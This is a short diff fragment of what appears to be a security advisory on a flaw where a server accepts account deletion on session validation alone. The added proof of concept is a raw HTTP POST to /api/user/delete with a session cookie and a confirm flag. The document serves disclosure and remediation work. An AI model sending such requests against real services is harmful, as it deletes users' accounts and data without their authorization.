@@ -15,4 +15,11 @@ The server relied solely on session validation and did not require re‑authenti
 
 ### Proof of Concept
 
+POST /api/user/delete HTTP/1.1
+Host: example.com
+Cookie: session=SESSION_ID
+Content-Type: application/json
 
+{
+  "confirm": true
+}
